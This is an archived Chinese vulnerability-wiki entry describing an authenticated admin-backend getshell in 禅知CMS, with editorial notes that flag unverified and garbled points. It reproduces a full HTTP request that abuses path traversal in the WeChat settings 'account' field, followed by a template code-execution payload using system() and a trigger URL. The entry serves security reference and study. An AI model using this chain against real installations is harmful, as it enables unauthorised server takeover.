---
source: "hatch 补库批 20260928"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "禅知后台getshell"
product: "禅知CMS"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "认证后台微信配置权限前提需明确"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-c4ac66286d70641f5856e3e8"
entity_id: "ve-c4ac66286d70641f5856e3e8"
schema_version: "1"
---

# 禅知后台getshell

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：禅知CMS
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：认证后台微信配置权限前提需明确
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 简介影响为空无原来源
2. 认证后台微信配置权限前提需明确
3. 要求文件但实际创建同名目录绕过存在性检查需解释
4. debug样式反斜杠链依Windows路径，不泛化Linux
5. http:/单斜杠和转义符污染
6. 写目录及模板执行需清理恢复

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

后台存在模板编辑，但是如果保存的话需要创建一个/system\\tmp\\xjrg.txt文件，那么我们找到一个可以创建任意文件的地方就

![](./.resource/禅知后台getshell/media/rId24.png)

在/system/module/wechat/model.php

![](./.resource/禅知后台getshell/media/rId25.png)

\$qrcodeFile未过滤目录穿越导致可以去其他地方创建文件夹通过微信设置原始ID的地方写入穿越的文件路径

![](./.resource/禅知后台getshell/media/rId26.png)

    POST /chanzhieps/www/admin.php?m=wechat&f=edit&publicID=1 HTTP/1.1
    Host: 0-sec.org
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    DNT: 1
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Referer: http://localhost/chanzhieps/www/admin.php?m=wechat&f=edit&publicID=1
    Content-Length: 120
    Cookie: adminsid=ae8tu3s80j8cfvh2hkgu41bbig; adminLang=zh-cn; adminDevice=desktop; theme=default; currentGroup=setting; frontsid=eaa0tdicbqfq0lurm89t3n9fvn; frontLang=zh-cn; frontDevice=desktop
    X-Forwarded-For: 8.8.8.8
    Connection: close

    type=subscribe&name=123&account=..%2F..%2F..%2Fsystem%5Ctmp%5Cxjrg.txt%5C1&appID=789&appSecret=100&token=222&certified=0

点一下二维码，再随便传一张图片，可以看到创建了一个xjrg.txt文件夹

![](./.resource/禅知后台getshell/media/rId27.png)

现在我们再去编辑模板，{!echo(system(\'ipconfig\'))},可以直接写入一句话

![](./.resource/禅知后台getshell/media/rId28.png)

然后在访问前台

http:/0-sec.org/chanzhieps/www/index.php/sitemap/

![](./.resource/禅知后台getshell/media/rId29.png)
